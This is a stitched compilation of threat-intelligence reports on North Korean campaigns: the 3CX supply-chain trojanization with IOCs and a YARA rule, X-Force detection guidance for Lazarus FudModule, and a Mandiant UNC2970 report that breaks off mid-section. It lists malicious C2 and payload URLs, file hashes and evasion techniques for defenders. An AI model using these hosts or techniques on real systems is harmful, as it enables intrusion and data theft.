officeaddons[.]com
officestoragebox[.]com
pbxcloudeservices[.]com
pbxphonenetwork[.]com
pbxsources[.]com
qwepoi123098[.]com
sbmsa[.]wiki
sourceslabs[.]com
visualstudiofactory[.]com
zacharryblogs[.]com
github[.]com/IconStorages/images
azureonlinestorage.com convieneonline[.]com
Soyoungjun[.]com	URL	Malicious URL
3bb80e9fbeac5383b313084775c80d11
9c943baad621654cc0a0495262b6175276a0a9fb
210c9882eba94198274ebc787fe8c88311af24932832a7fe1f1ca0261f815c3d	MD5
SHA1
SHA256	Malicious ICO File
644f63f869e2b0a9e5d1aa32823956cc
96910a3dbc194a7bf9a452afe8a35eceb904b6e4
a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c	MD5
SHA1
SHA256	Malicious ICO File
8875568b90bb03ff54d63d3bd1187063
0d890267ec8d6d2aaf43eaca727c1fbba6acd16e
d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090	MD5
SHA1
SHA256	Malicious ICO File
1640f48cc05c58f4cc077503a5361cea
b1dee3ebcffad01a51ff31ff495fef1d40fdfaa0
d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a	MD5
SHA1
SHA256	Malicious ICO File
71d5b9bfd6bf37ff5aa9752b2b6d5af1
64ab912d0af35c01355430d85dd4181f25e88838
4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f	MD5 SHA1 SHA256	Malicious ICO File
da667174c2d145a4d9b3b39387fbd7dd
8377fb40c76aa3ba3efae3d284fa51aa7748e010
8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d	MD5
SHA1
SHA256	Malicious ICO File
69455ba3bfd2d8e3ade5081368934945
11ae67704ea0b930b2cc966e6d07f8b898f1a7d2
f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3	MD5
SHA1
SHA256	Malicious ICO File
848bc8e5917db1f735029fc51952002d
ffccc3a29d1582989430e9b6c6d2bff1e3a3bb14
2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f	MD5
SHA1
SHA256	Malicious ICO File
aafa584176d9aec7912b4bc3476acc1a
89827af650640c7042077be64dc643230d1f7482
268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca	MD5
SHA1
SHA256	Malicious ICO File
4d112603466ac9c57a669445374c1fb5
b5de30a83084d6f27d902b96dd12e15c77d1f90b
c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd	MD5
SHA1
SHA256	Malicious ICO File
d232fa2eabc03123517a78936a18448b
3992dbe9e0b23e0d4ca487faffeb004bcfe9ecc8
c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396	MD5
SHA1
SHA256	Malicious ICO File
aff5911f6c211cde147a0d6aa3a7a423
caa77bcd0a1a6629ba1f3ce8d1fc5451d83d0352
f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182	MD5
SHA1
SHA256	Malicious ICO File
4942dc3c0e9808544b068854cf1351e0
57a9f3d5d1592a0769886493f566930d8f32a0fc
2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de	MD5
SHA1
SHA256	Malicious ICO File
3eb70db2f6bffbe29970f759747e07bd
f533bea1c0558f73f6a3930343c16945fb75b20f
e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c	MD5
SHA1
SHA256	Malicious ICO File
14b79d2f81d1c0a9c3769f7bb83e443d
31d775ab577f3cc88991d90e9ae58501dbe1f0da
d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e	MD5
SHA1
SHA256	Malicious ICO File
Yara Rules
•	https://github.com/volexity/threat-intel/blob/main/2023/2023-03-30%203CX/indicators/rules.yar
•	signature-base/gen_mal_3cx_compromise_mar23.yar at master · Neo23x0/signature-base · GitHub
Reference:
https://www.3cx.com/blog/news/desktopapp-security-alert/
 
POSTED: 30 MAR, 20237 MIN READTHREAT INTELLIGENCE
 TRANSLATION: 日本語
 SUBSCRIBE
FOLLOW
twitterlinkedin
3CX: Supply Chain Attack Affects Thousands of Users Worldwide
North Korean-sponsored actors believed to be linked to attack that Trojanized several versions of 3CX DesktopApp
UPDATE March 31 2023 14:26 UTC: Our blog has been updated with a Yara rule to detect the final infostealer payload.
UPDATE March 30 2023 17:39 UTC: Our blog has been updated with technical analysis of the macOS versions.
UPDATE March 30 2023 14:17 UTC: Our blog has been updated with  additional IOCs
UPDATE March 30 2023 12:47 UTC: Our blog has been updated with additional IOCs and protection information.
UPDATE March 30 2023 9:07 UTC: Our blog has been updated with technical analysis of the malware used.
Attackers believed to be linked to North Korea have Trojanized 3CX's DesktopApp, a widely-used voice and video calling desktop client. In an attack reminiscent of SolarWinds, installers for several recent Windows and Mac versions of the software were compromised and modified by the attackers in order to deliver additional information stealing malware to the user’s computer. The information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise.
Attack chain
The attackers compromised installer files for at least two Windows versions (18.12.407 and 18.12.416) and two Mac versions (8.11.1213 and latest) of 3CX DesktopApp. The installers contained clean versions of the app along with malicious DLLs. The app was used to sideload the malicious DLLs, which then installed information-stealing malware on the computer.   
In two variants analyzed by Symantec (SHA256: aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 and 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983), the clean executable was used to load a malicious DLL named ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896)
This DLL contains code that will load and execute a payload from a second DLL named d3dcompiler_47.dll. (SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03)
D3dcompiler_47.dll contains an encrypted blob appended to the file, suggesting that it is possibly a Trojanized version of a legitimate file. The blob starts with the hex value “FEEDFACE” which the loader uses to find the blob. The decrypted blob contains shellcode and a third DLL (SHA256: aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973).
The shellcode loads and executes this third DLL, export DLLGetClassObject with parameters:
•	1200 2400 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
•	AppleWebKit/537.36 (KHTML, like Gecko) 3CXDesktopApp/18.11.1197
•	Chrome/102.0.5005.167 Electron/19.1.9 Safari/537.36”
It will then attempt to download an ICO file from the following GitHub repository:
•	https://raw.githubusercontent[].com/IconStorages/images/main/icon%d.ico
Mac versions
At last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software.
The malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request.
It attempts to download a payload from:
•	URL: https://msstorageazure[.]com/analysis
•	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36
The following URLs were embedded in analyzed variants:
•	officestoragebox[.]com/api/biosync
•	visualstudiofactory[.]com/groupcore
•	azuredeploystore[.]com/cloud/images
•	msstorageboxes[.]com/xbox
•	officeaddons[.]com/quality
•	sourceslabs[.]com/status
•	zacharryblogs[.]com/xmlquery
•	pbxcloudeservices[.]com/network
•	pbxphonenetwork[.]com/phone
•	akamaitechcloudservices[.]com/v2/fileapi
•	azureonlinestorage[.]com/google/storage
•	msedgepackageinfo[.]com/ms-webview
•	glcloudservice[.]com/v1/status
•	pbxsources[.]com/queue
Mitigation
3CX is aware of the compromise and is advising users to immediately uninstall the app. It said that it is working on an update to the software that will be released within hours. It advised users to consider using its PWA client as an alternative until a clean version of DesktopApp is released.
Protection
File-based
•	Infostealer
•	Trojan Horse
•	Trojan.Dropper
•	Trojan.Malfilter
•	WS.Malware.2
•	OSX.Samsis
•	Trojan.Samsis
Machine Learning-based
•	Heur.AdvML.A
•	Heur.AdvML.B
Network-based
•	Malicious Site: Malicious Domains Request
•	Malicious Site: Malicious Domain Request 59
•	Web Attack: WebPulse Bad Reputation Domain Request
For the latest protection updates, please visit the Symantec Protection Bulletin.
Yara Rule to detect final infostealer payload
rule icon_3cx_stealer {
 
    meta:
        copyright = "Symantec"
        description = "Infostealer component used in 3CX supply chain attack"
          
    strings:
        $a1 = "******************************** %s ******************************" wide fullword
        $a2 = "\\3CXDesktopApp\\config.json" wide fullword
        $a3 = { 7B 00 22 00 48 00 6F 00 73 00 74 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 44 00 6F 00 6D 00 61 00 69 00 6E 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 4F 00 73 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 22 00 3A 00 20 00 22 00 25 00 64 00 2E 00 25 00 64 00 2E 00 25 00 64 00 22 00 7D }
        $b1 = "HostName: %s" wide fullword
        $b2 = "DomainName: %s" wide fullword
        $b3 = "OsVersion: %d.%d.%d" wide fullword
        $b4 = "%s.old" wide fullword
 
    condition:
        3 of ($a*) and 2 of ($b*)
}
For more information on scanning SEP client computers using custom Yara rules, read this knowledge base article.
Indicators of Compromise
dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc – Windows app
aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 – Windows installer
fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 – Windows app
59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 – Windows installer
92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 – macOS app
5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 – macOS installer
b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb – macOS app
e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec – macOS installer
11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 – Infostealer (d3dcompiler_47.dll)
7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 - Infostealer (ffmpeg.dll )
aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973 - Infostealer 
c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 - Infostealer (ffmpeg.dll)
fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7 - Malicious macOS library (libffmpeg.dylib)
a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 - Malicious macOS library (libffmpeg.dylib)
210c9882eba94198274ebc787fe8c88311af24932832a7fe1f1ca0261f815c3d – Malicious ICO file (icon0.ico)
a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c – Malicious ICO file (icon1.ico)
d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon10.ico)
d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon11.ico)
d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a – Malicious ICO file (icon12.ico)
4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f – Malicious ICO file (icon13.ico)
8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d – Malicious ICO file (icon14.ico)
f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 – Malicious ICO file (icon15.ico)
2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f – Malicious ICO file (icon2.ico)
268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca – Malicious ICO file (icon3.ico)
c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd – Malicious ICO file (icon4.ico)
c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 – Malicious ICO file (icon5.ico)
f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 – Malicious ICO file (icon6.ico)
2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de – Malicious ICO file (icon7.ico)
e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c – Malicious ICO file (icon8.ico)
d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e – Malicious ICO file (icon9.ico)
akamaicontainer[.]com
akamaitechcloudservices[.]com
azuredeploystore[.]com
azureonlinecloud[.]com
azureonlinestorage[.]com
dunamistrd[.]com
glcloudservice[.]com
journalide[.]org
msedgepackageinfo[.]com
msstorageazure[.]com
msstorageboxes[.]com
officeaddons[.]com
officestoragebox[.]com
pbxcloudeservices[.]com
pbxphonenetwork[.]com
pbxsources[.]com
qwepoi123098[.]com
sbmsa[.]wiki
sourceslabs[.]com
visualstudiofactory[.]com
zacharryblogs[.]com
raw.githubusercontent[.]com/IconStorages/images/main/
 
When the absence of noise becomes signal: Defensive considerations for Lazarus FudModule
 
LightDark
________________________________________
March 20, 2023By John Dwyer7 min read
________________________________________
Offensive Security
Endpoint
Incident Response
Malware
Threat Hunting
X-Force

________________________________________
    
In February 2023, X-Force posted a blog entitled “Direct Kernel Object Manipulation (DKOM) Attacks on ETW Providers” that details the capabilities of a sample attributed to the Lazarus group leveraged to impair visibility of the malware’s operations. This blog will not rehash analysis of the Lazarus malware sample or Event Tracing for Windows (ETW) as that has been previously covered in the X-Force blog post. This blog will focus on highlighting the opportunities for detection of the FudModule within the Lazarus sample analyzed by X-Force, as well as highlight a strategy of using telemetry stream health as a mode of detecting malware designed to impair defenses through ETW tampering.
One Ring 0 to rule them all
The Lazarus FudModule begins with the installation of a Dell driver that is vulnerable to CVE-2021-21551 which allows the malware to elevate privileges to a level where DKOM attacks are possible. This type of attack is referred to as a bring your own vulnerable driver (BYOVD) attack. In a BYOVD attack, an attacker installs a driver that is vulnerable to an exploit that enables the attacker to cross the boundary from administrative access to ring 0 or kernel-mode access. Ring 0 access enables the attacker to bypass or disable security technology and evade detection by security professionals by operating deeper within the operating system.
Can’t hit what you can’t see
As detailed in the X-Force blog, after obtaining kernel mode privileges the FudModule begins targeting kernel structures to impair telemetry sources on the host by targeting Event Tracing for Windows (ETW) registration handles. ETW registration handles are used to retrieve configuration information for a specific provider, the handle can test whether a provider is enabled for specific keywords or information levels. Additionally, ETW registration handles are used to call event tracing and logging functions for a specific provider. The FudModule leverages the nt!EtwRegister function to enumerate entries associated with the RegHandle parameter and then updates the value with NULL effectively disabling all system ETW providers for all consuming applications, including those providers used by some antivirus and endpoint detection and response (EDR) solutions.
Dynamic detection opportunity through monitoring ETW data stream health
While the FudModule’s capability to tamper with ETW registration handles does enable it to create and operate within a blind spot for security tooling, this is not the first piece of malware X-Force has encountered that tampers with data streams to avoid detection. To handle these types of detection challenges, X-Force has developed a detection method focused on identification of malicious activity by testing data stream health.
The following section will demonstrate a proof-of-concept ETW data stream monitor like X-Force’s using PowerShell and Symon so organizations can start considering a similar detection capability. 
The FudModule’s attack against ETW registration handles may disable ETW monitoring providers, but X-Force was not able to uncover evidence that the malware prevents new ETW registration handles from being created and used. Defenders can leverage this opportunity to register a new ETW session to an existing security-related ETW provider, create test data, and compare the telemetry between the new ETW session and the existing ETW session. Organizations can implement a similar strategy to detect when there is a discrepancy between the telemetry registered in the data source and raise an alarm regarding security-related ETW data stream health when a discrepancy is observed.
When Microsoft deployed PatchGuard in the early 2000s, it limited the ability for security vendors to hook the kernel directly to detect malware executing on a system. Since the introduction of PatchGuard, vendors have leveraged Kernel callback functions to monitor activities on a system. For a comprehensive list of Kernel callback functions here, see the Kernel CallbackFunctions list created by CodeMachine here.
The most common Kernel callback functions leveraged by security vendors are:
•	PsSetCreateProcessNotifyRoutine
•	CmRegisterCallbackEx
•	PsSetCreateThreadNotifyRoutine
•	ObRegisterCallbacks
•	PsSetLoadImageNotifyRoutine
For the purposes of this blog, we will be focusing on PsSetCreateProcessNotifyRoutine which is a callback routine to monitor process creation activities performed by APIs like CreateProcess(), CreateProcessAsUser(), CreateProcessWithToken(), and CreateProcessWithLogon().
Security products often leverage PsSetCreateProcessNotifyRoutine as a mechanism to be notified when a user spawns a new process via the CreateProcessW() function in kernel32.dll. With the introduction of kernel-mode drivers for modern security products, they are now able to intercept and inject into resulting process creation events by hooking ntdll.dll to perform inspections of the process activity.
To simulate the resulting blind spots from the FudModule, X-Force will disrupt the data streams enabling Sysmon to monitor process creation events via PsSetCreateProcessNotifyRoutine without stopping the Sysmon ETW Trace Session or removing the ETW Provider.
  
Sysmon Operating Normally
To simulate the BYOVD attack, X-Force leveraged PsExec to assume privileges of NT Authority\SYSTEM and modified the Sysmon ETW Trace configuration so that while the System ETW Trace Session is running, no data will be written to the Event Log.
  
Sysmon After Trace Session Tampering
At this point, the Sysmon service is running, the ETW Trace is running, and the Sysmon ETW provider is available, but no process creation events are being written to the Event Log effectively simulating the behavior of the FudModule for a single ETW data source on an infected system.
As previously stated, the FudModule does not appear to remove providers or continually null value ETW registration handles, so Defenders now have an opportunity to test ETW data stream health and be alerted when security telemetry is not operating as expected either through corruption or malicious activity. Fortunately, Microsoft makes this process easy with a default ETW provider called Microsoft-Windows-Kernel-Process which handles the execution of all threads in a process and directly interacts with the PsSetCreateProcessNotifyRoutine routine.
Within the Microsoft-Windows-Kernel-Process provider, various data sources are available including new process creation, process thread, image loads, and CPU priority. Using the logman utility, defenders can easily create a new ETW Trace Session to collect new process creation events.
  
Creating a New ETW Trace for Process Creation Events
The following PowerShell is a proof-of-concept replicating the core capabilities of X-Force’s telemetry stream health tests for threat detection. In this script, a new ETW Trace session is created and subscribed to Microsoft-Windows-Kernel-Process WINEVENT_KEYWORD_PROCESS events. The script then creates test data using the current timestamp as a unique identifier and checks whether the test data was located within the newly created ETW Trace session and Sysmon. When the test data is not found in the Sysmon log, an alert is written to the Application Event Log which can be alerted upon for defenders.
  
ETW Data Health Test Script
  
Create Alert When Telemetry Health Test Fails
The following sections will detail static detection opportunities for the Lazarus FudModule based on the analysis of the malware sample.
Static detection opportunities within file activity
To initiate the BYOVD attack, the FudModule loads an embedded version of the Dell dbutil_2_3.system driver, which contains an insufficient access control vulnerability (CVE-2021-21551) enabling the malware to escalate privileges. The FudModule extracts the driver files to C:\Windows\System32\drivers\ under a name randomly chosen from the following list:
•	circlassmgr.sys
•	dmvscmgr.sys
•	hidirmgr.sys
•	isapnpmgr.sys
•	mspqmmgr.sys
•	umpassmgr.sys
X-Force was unable to locate any legitimate driver installations associated with the filenames used by the FudModule so defenders may be able to detect the malicious driver installation through monitoring file activity where the filenames listed above are written to %windr%\system32\drivers.
Static detection opportunities within event log data
The main functionality of the FudModule is directed towards the Windows kernel space however when first loaded, the malware is operating within user mode meaning it cannot interact with kernel memory directly. To overcome this privilege issue, the FudModule executes the BYOVD attack leveraging the previously mentioned Dell driver. The Dell driver is installed as a kernel mode driver which combined with the CVE-2-1-2155 vulnerability enables the malware to the ability to escalate privileges to allow for writing to kernel memory.
In Microsoft Windows, when a kernel mode driver is installed a System Event Log Event ID 7045 is generated. System event log 7045 entries contain the name of the driver, the full path to the driver file, and the type of driver that was installed (either kernel or user mode). Defenders can detect the installation of the vulnerable driver as part of the FudModule by collecting Windows Event System Log entries where the Service Type is set to “kernel mode driver” and the Service File Name contains one of the following filenames:
•	circlassmgr.sys
•	dmvscmgr.sys
•	hidirmgr.sys
•	isapnpmgr.sys
•	mspqmmgr.sys
•	umpassmgr.sys
  
Static detection opportunities within setup API log data
The following detection opportunity is not specific to the FudModule. Throughout the research performed by X-Force on malicious use of the Dell DBUtil driver, X-Force identified additional malware and tools that leverage the Dell DBUtil BYOVD attack and identified the following detection point.
When the Dell Client Platform DBUtil driver is installed, the Microsoft Windows Plug and Play Devices module initiates the driver installation process. This process is captured within the SetupAPI log file located in %windir%\inf\setupapi.dev.log. The SetupAPI log was introduced in Windows Vista and contains information about device and driver installations including the initiating process, driver paths, and troubleshooting data.
Analysis of legitimate and malicious installations of the Dell DBUtil driver indicated that regardless of the implementation, the Device Install in the SetupAPI log will register the device as “ROOT\DBUtilDrv2”. Within the SetupAPI log file, defenders may be able to detect malicious installation of the DBUtil driver by collecting and parsing the SetupAPI log file for “ROOT\DBUtilDrv2” where the associated command and INF path do not match with the legitimate Dell Driver Install data shown below.
  
Legitimate DBUtil Install SetupAPI Data
  
Malicious DBUtil Install SetupAPI Data
Static detection opportunity through IOCs
FudModule.dll File Hash: 97C78020EEDFCD5611872AD7C57F812B069529E96107B9A33B4DA7BC967BF38F
Dbutil_2_3.sys File Hash: 0296E2CE999E67C76352613A718E11516FE1B0EFC3FFDB8918FC999DD76A73A5
 
Stealing the LIGHTSHOW (Part One) — North Korea's UNC2970
MANDIANT INTELLIGENCE AND CONSULTING
MAR 09, 2023
25 MIN READ
|   LAST UPDATED: APR 20, 2023
THREAT INTELLIGENCE
CONSULTING
MANAGED DEFENSE
UNCATEGORIZED GROUPS (UNC GROUPS)
NORTH KOREA
Since June 2022, Mandiant has been tracking a campaign targeting Western Media and Technology companies from a suspected North Korean espionage group tracked as UNC2970. In June 2022, Mandiant Managed Defense detected and responded to an UNC2970 phishing campaign targeting a U.S.-based technology company. During this operation, Mandiant observed UNC2970 leverage three new code families: TOUCHMOVE, SIDESHOW, and TOUCHSHIFT. Mandiant suspects UNC2970 specifically targeted security researchers in this operation. Following the identification of this campaign, Mandiant responded to multiple UNC2970 intrusions targeting U.S. and European Media organizations through spear-phishing that used a job recruitment theme and demonstrated advancements in the groups ability to operate in cloud environments and against Endpoint Detection and Response (EDR) tools.
UNC2970 is suspected with high confidence to be UNC577, also known as Temp.Hermit. UNC577 is a cluster of North Korean cyber activity that has been active since at least 2013. The group has significant malware overlaps with other North Korean operators and is believed to share resources, such as code and complete malware tools with other distinct actors. While observed UNC577 activity primarily targets entities in South Korea, it has also targeted other organizations worldwide.
UNC2970 has historically targeted organizations with spear phishing emails containing a job recruitment theme. These operations have multiple overlaps with public reporting on “Operation Dream Job” by Google TAG, Proofpoint, and ClearSky.
UNC2970 has recently shifted to targeting users directly on LinkedIn using fake accounts posing as recruiters. UNC2970 maintains an array of specially crafted LinkedIn accounts based on legitimate users. These accounts are well designed and professionally curated to mimic the identities of the legitimate users in order to build rapport and increase the likelihood of conversation and interaction. UNC2970 uses these accounts to socially engineer targets into engaging over WhatsApp, where UNC2970 will then deliver a phishing payload either to a target’s email, or directly over WhatsApp. UNC2970 largely employs the PLANKWALK backdoor during phishing operations as well as other malware families that share code with multiple tools leveraged by UNC577. Mandiant recently published a blog post detailing UNC2970 activity that was identified by Mandiant Managed Defense during proactive threat hunting. This activity was initially clustered as UNC4034 but has since been merged into UNC2970 based on multiple infrastructure, tooling, and tactics, techniques, and procedures (TTP) overlaps.
When you're done reading this post, don't forget to check out part two on LIGHTSHIFT and LIGHTSHOW.
Summary
In June 2022, Mandiant Managed Defense detected and responded to an UNC2970 phishing campaign targeting a U.S.-based technology company. During this operation, Mandiant observed UNC2970 leverage three new code families: TOUCHMOVE, SIDESHOW, and TOUCHSHIFT. Mandiant suspects UNC2970 specifically targeted security researchers in this operation. Following the identification of this campaign, Mandiant responded to multiple UNC2970 intrusions targeting U.S. and European Media organizations through spear-phishing that used a job recruitment theme.
Initial Access
When conducting phishing operations, UNC2970 engaged with targets initially over LinkedIn masquerading as recruiters. Once UNC2970 contacts a target, they would attempt to shift the conversation to WhatsApp, where they would continue interacting with their target before sending a phishing payload that masqueraded as a job description. In at least one case, UNC2970 continued interacting with a victim even after the phishing payload was executed and detected, asking for screenshots of the detection.
The phishing payloads primarily utilized by UNC2970 are Microsoft Word documents embedded with macros to perform remote-template injection to pull down and execute a payload from a remote command and control (C2). Mandiant has observed UNC2970 tailoring the fake job descriptions to specific targets.
 Figure 1: UNC2970 lure document
The C2 servers utilized by UNC2970 for remote template injection have primarily been compromised WordPress sites, a trend observed in other UNC2970 code families as well as those used by other DPRK groups. At the time of analysis, the remote template was no longer present on the C2, however following this phishing activity, Mandiant identified it beaconing to a C2 associated with PLANKWALK.
In the most recent UNC2970 investigation, Mandiant observed the group returning to WhatsApp to engage their targets. This activity overlaps with a recent blog post by MSTIC on operations from ZINC, as well as the previously mentioned Mandiant blog post from July 2022.
The ZIP file delivered by UNC2970 contained what the victim thought was a skills assessment test for a job application. In reality, the ZIP contained an ISO file, which included a trojanized version of TightVNC that Mandiant tracks as LIDSHIFT. The victim was instructed to run the TightVNC application which, along with the other files, are named appropriately to the company the victim had planned to take the assessment for.
In addition to functioning as a legitimate TightVNC viewer, LIDSHIFT contained multiple hidden features. The first was that upon execution by the user, the malware would send a beacon back to its hardcoded C2; the only interaction this needed from the user was the launching of the program. This lack of interaction differs from what MSTIC observed in their recent blog post. The initial C2 beacon from LIDSHIFT contains the victim’s initial username and hostname.
LIDSHIFT’s second capability is to reflectively inject an encrypted DLL into memory. The injected DLL is a trojanized Notepad++ plugin that functions as a downloader, which Mandiant tracks as LIDSHOT. LIDSHOT is injected as soon as the victim opens the drop down inside of the TightVNC Viewer application. LIDSHOT has two primary functions: system enumeration and downloading and executing shellcode from the C2.
LIDSHOT sends the following information back to its C2:
•	Computer Name
•	Product name as recorded in the following registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName
•	IP address
•	Process List with User and Session ID associate per process
Establish Foothold
In multiple investigations, Mandiant has observed UNC2970 deploy PLANKWALK to establish footholds within environments. PLANKWALK is a backdoor written in C++ that communicates over HTTP and utilizes multiple layers of DLL sideloading to execute an encrypted payload. PLANKWALK is initially executed through a launcher that will import and execute a second stage launcher expected to be on disk.
Observed First Stage Launcher names:
•	destextapi.dll
•	manextapi.dll
•	pathextapi.dll
•	preextapi.dll
•	Wbemcomn.dll
Once loaded and executed, the secondary launcher will attempt to decrypt and execute an encrypted PLANKWALK sample on disk that matches the following pattern:
C:\ProgramData\Microsoft\Vault\cache.db
Once executed, PLANKWALK will decrypt an on-host encrypted configuration file that contains the C2 for the backdoor. The C2 for PLANKWALK has largely been co-opted by legitimate WordPress sites.
Following the deployment of PLANKWALK, Mandiant observed UNC2970 leverage a wide variety of additional tooling, including Microsoft InTune to deploy a shellcode downloader.
Tool Time: Kim “The Toolman” Taylor
During their operations, Mandiant has observed UNC2970 use a wide range of custom, post-exploitation tooling to achieve their goals. One of UNC2970's go-to tools has been a dropper tracked as TOUCHSHIFT. TOUCHSHIFT allows UNC2970 to employ follow-on tooling that range from keyloggers and screenshot utilities, to full featured backdoors.
TOUCHSHIFT
TOUCHSHIFT is a malicious dropper that masquerades as mscoree.dll or netplwix.dll. TOUCHSHIFT is typically created in the same directory and simultaneously as a legitimate copy of a Windows binary. TOUCHSHIFT leverages DLL Search Order Hijacking to use the legitimate file to load and execute itself. TOUCHSHIFT has been observed containing one to two various payloads which it executes in-memory. Payloads that have been seen include TOUCHSHOT, TOUCHKEY, HOOKSHOT, TOUCHMOVE, and SIDESHOW.
To appear legitimate, the file uses over 100 exports that match common system export names. However, the majority all point to the same empty function. The malicious code has been seen located in exports LockClrVersion or UsersRunDllW in different instances.
 Figure 2: Malicious export alongside several of the dummy exports
When TOUCHSHIFT contains a second payload, it takes a single character command line option as its first argument to determine which of the two payloads to execute.
 Figure 3: Checking command line options
To unpack its payload(s), TOUCHSHIFT generates a decryption key by XOR encoding its second argument and the first 16 characters of the legitimate executable’s file name.
For example, in one instance Mandiant observed the arguments -CortanaUIFilter, XOR encoded with the hardcoded key 009WAYHb90687PXkS, and printfilterpipel, which was XOR encoded with the hardcoded key .sV%58&.lypQ[$= and was loaded by the file printfilterpipelinesvc.exe. In another instance, the argument used was --forkavlauncher and the loading file was C:\windows\Branding\Netplwiz.exe.
Once the code is unpacked, it is then loaded into a memory location created by a call to VirtualAlloc and executed from there.
 Figure 4: Beginning of unpacked payload in memory
Once the payload(s) has/have been executed, the main portion of TOUCHSHIFT will sleep for a period of time allowing the payload(s) to continue executing.
TOUCHSHIFT-ing into Gear — Follow on payloads
TOUCHSHOT
TOUCHSHOT takes screenshots of the system on which it is running and saves them to a file to be retrieved by the threat actor at a later time. TOUCHSHOT is configured to take a screenshot every three seconds, and then uses ZLIB to compress the images. The compressed data is then appended to a file that it creates and continues appending new screenshots to this file until the file reaches five megabytes in size, at which point it will create a new file with the same naming convention. TOUCHSHOT was seen embedded in the same instance of TOUCHSHIFT as TOUCHKEY (discussed later in the post).
TOUCHSHOT will create a file in the C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Themes\ directory, and will name the file ~DM{####}P.dat, where the four numbers are pseudo-randomly generated. Once TOUCHSHOT has generated the file name, it attempts to create a handle to the file. If the return value indicates that the file does not exist, it will then create the file. This check is performed as part of a loop that continues until a new file needs to be created. After each iteration of the loop, TOUCHSHOT will then take a screenshot, which is appended to the staging file.
 Figure 5: Generation of the directory path Figure 6: Generation of file name with pseudo-random numbers Figure 7: Creating a handle to the file or creating it Figure 8: Taking a screenshot
TOUCHKEY
